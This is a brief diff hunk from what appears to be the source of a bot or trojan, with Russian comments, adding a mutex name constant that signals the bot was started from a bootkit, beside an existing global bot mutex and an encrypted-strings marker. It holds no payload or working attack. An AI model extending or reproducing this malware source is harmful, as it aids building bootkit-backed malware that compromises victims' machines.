@@ -51,6 +51,7 @@ CSSTR BeginCryptBlock[] = ENCRYPTED_STRINGS_BEGIN;  //
 
 
 CSSTR StrBotGlobalMutexName[] = "GSA28593KFE7"; // Префикс глобального мьютекса сигнализирующего, что бот запущен
+CSSTR StrBootkitIsRunMutex[] = "BIR737JK3LJ"; //мьютекс сигнализирующий, что запущен бот из под буткита
 
 
 // Оригинальное имя ехе файла бота
